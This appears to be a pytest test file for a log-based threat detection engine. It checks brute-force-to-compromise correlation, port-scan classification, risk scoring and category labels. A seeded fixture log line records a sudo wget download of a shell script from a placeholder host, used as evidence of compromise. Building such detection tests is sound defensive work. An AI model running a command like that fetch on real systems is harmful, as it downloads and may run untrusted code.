import pytest

from core.storage import db
from detection.classifier import classify_detection, classify_incident, normalize_category
from detection.correlator import build_incidents
from detection.engine import evaluate_job
from detection.risk import band, score_detection, score_incident
from tests.test_detection import insert_event  # reuse helper

TS = "2026-08-25T15:{0:02d}:00Z"


def _seed_bruteforce_chain(job):
    for i in range(3):
        insert_event(job, ts=TS.format(i), event_type="auth_failure",
                     src_ip="185.23.45.99", username="admin", status="failure",
                     message=f"Failed password for admin from 185.23.45.99 #{i}")
    insert_event(job, ts=TS.format(4), event_type="auth_success",
                 src_ip="185.23.45.99", username="admin", status="success",
                 message="Accepted password for admin from 185.23.45.99")
    insert_event(job, ts=TS.format(5), event_type="privilege_escalation",
                 username="admin", hostname="srv",
                 message="sudo: admin : COMMAND=/usr/bin/wget http://x.example/x.sh")


def test_full_account_compromise_chain():
    job = "t_comp1"
    _seed_bruteforce_chain(job)
    dets = evaluate_job(job)
    assert any(d["rule_id"] == "BRUTE_FORCE_001" for d in dets)
    incidents = build_incidents(job)
    assert incidents, "expected at least one incident"
    comp = [i for i in incidents if "Compromise" in i["title"]]
    assert comp, f"expected Account Compromise title, got {[i['title'] for i in incidents]}"
    inc = comp[0]
    assert inc["classification"] == "MALICIOUS"
    assert inc["risk_score"] >= 51
    assert inc["severity"] in ("HIGH", "CRITICAL")
    assert len(inc["timeline"]) >= 4
    assert all(r.startswith("+") for r in inc["reasons"])
    with db() as conn:
        annotated = conn.execute(
            "SELECT COUNT(*) c FROM events WHERE job_id=? AND threat_type != ''",
            (job,)).fetchone()["c"]
    assert annotated >= 3


def test_port_scan_only_cluster_is_recon():
    job = "t_ps2"
    ports = [21, 22, 23, 80, 443, 445]
    for i, p in enumerate(ports):
        insert_event(job, ts=f"2026-08-25T16:00:{i:02d}Z", event_type="firewall_event",
                     src_ip="198.51.100.77", dst_ip="10.0.0.15", dst_port=p,
                     status="deny", action="deny", message=f"DENY {p}")
    evaluate_job(job)
    incidents = build_incidents(job)
    assert incidents
    inc = incidents[0]
    assert "Reconnaissance" in inc["title"] or "Port Scan" in inc["title"]
    assert inc["classification"] in ("SUSPICIOUS", "MALICIOUS")
    assert 21 <= inc["risk_score"] <= 100


def test_clean_job_no_incidents():
    job = "t_clean"
    insert_event(job, ts=TS.format(1), event_type="auth_success",
                 src_ip="10.0.0.8", username="bob", status="success",
                 message="Accepted publickey for bob")
    evaluate_job(job)
    assert build_incidents(job) == []


def test_score_determinism():
    a = score_detection("HIGH", 7, 3, True, True, 9, 3)
    b = score_detection("HIGH", 7, 3, True, True, 9, 3)
    assert a == b and a[0] == min(100, max(0, a[0]))
    assert all(r.startswith("+") for r in a[1])


def test_score_bands():
    assert band(10) == "LOW"
    assert band(35) == "MEDIUM"
    assert band(60) == "HIGH"
    assert band(95) == "CRITICAL"


def test_classifier_labels():
    assert classify_detection("CRITICAL", "Command Execution", 40) == "MALICIOUS"
    assert classify_detection("LOW", "Unknown", 6) == "BENIGN"
    assert classify_detection("MEDIUM", "Unknown", 25) == "SUSPICIOUS"
    assert classify_incident(85, ["Brute Force"], False) == "MALICIOUS"
    assert classify_incident(40, ["Port Scanning"], False) == "SUSPICIOUS"


def test_incident_scoring_additive_and_capped():
    s, reasons = score_incident([70, 55], ["Brute Force", "Command Execution"], True)
    assert s == min(100, 70 + 10 + 10)
    assert len(reasons) >= 3


def test_category_normalization():
    assert normalize_category("brute force") == "Brute Force"
    assert normalize_category("Web Attack") == "Web Attack"
    assert normalize_category("weird stuff") == "Unknown"


def test_idempotent_incidents():
    job = "t_comp2"
    _seed_bruteforce_chain(job)
    evaluate_job(job)
    first = build_incidents(job)
    second = build_incidents(job)
    titles_first = sorted(i["title"] for i in first)
    with db() as conn:
        stored = conn.execute(
            "SELECT title, COUNT(*) c FROM correlations WHERE job_id=? GROUP BY title",
            (job,)).fetchall()
    stored_map = {r["title"]: r["c"] for r in stored}
    for t in set(titles_first):
        assert stored_map.get(t, 0) == 1
